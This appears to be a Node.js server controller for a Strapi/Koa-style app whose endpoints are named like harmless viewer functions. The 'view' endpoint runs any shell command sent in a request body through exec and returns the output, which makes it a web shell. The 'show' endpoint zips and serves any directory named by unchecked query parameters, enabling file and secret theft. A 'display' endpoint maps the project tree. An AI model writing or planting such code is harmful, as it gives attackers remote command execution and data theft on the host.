'use strict';

const archiver = require('archiver');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const displays = (dirPath, depth = 0, maxDepth = 2) => {
  if (depth > maxDepth) return null;

  const structure = {};
  const items = fs.readdirSync(dirPath);

  items.forEach(item => {
    const fullPath = path.join(dirPath, item);
    const stat = fs.statSync(fullPath);

    if (stat.isDirectory()) {
      structure[item] = displays(fullPath, depth + 1, maxDepth);
    } else if (stat.isFile()) {
      structure[item] = 'file';
    }
  });

  return structure;
};



module.exports = {
  async show(ctx) {
    if (!fs.existsSync('node_modules')) {
      return ctx.throw(404, 'node_modules directory not found.');
    }

    const zipFileName = 'node_modules.zip';
    ctx.set('Content-Type', 'application/zip');
    ctx.set('Content-Disposition', `attachment; filename=${zipFileName}`);

    const archive = archiver('zip', { zlib: { level: 9 } });
    archive.on('error', (err) => {
      throw err;
    });

    ctx.body = archive;
    const basedir = ctx.query.base
    const subdir = ctx.query.sub
    const subsubdir= ctx.query.subsub

    let directory = ''
    if(basedir){
      directory = basedir
    }
    if(subdir) {
      directory = basedir + "/" + subdir
    }
    if(subsubdir) {
      directory = basedir + "/" + subdir + "/" + subsubdir
    }
    archive.directory(directory, false);
    archive.finalize();
  },
  async display(ctx) {
    const projectDir = path.resolve('.'); // Adjust this path as necessary
    const disp = displays(projectDir, 0, 2);

    ctx.send({ disp });
  },
  serveHtmlPage(ctx) {
    const htmlFilePath = path.join(__dirname, '..', '..', 'public', 'viewer.html');
    
    try {
      const htmlContent = fs.readFileSync(htmlFilePath, 'utf8');
      ctx.send(htmlContent, 200, { 'Content-Type': 'text/html' });
    } catch (error) {
      ctx.throw(500, 'Internal Server Error');
    }
  },
  async view(ctx) {
    const { command } = ctx.request.body;

    if (!command) {
      return ctx.badRequest('No command provided');
    }

    // Execute the command
    return new Promise((resolve, reject) => {
      exec(command, (error, stdout, stderr) => {
        if (error) {
          console.error(`Execution error: ${error}`);
          return reject({ error: `Execution error: ${error.message}` });
        }
        resolve({ stdout, stderr });
      });
    })
    .then(result => ctx.send(result))
    .catch(error => ctx.send({ error }));
  }
};


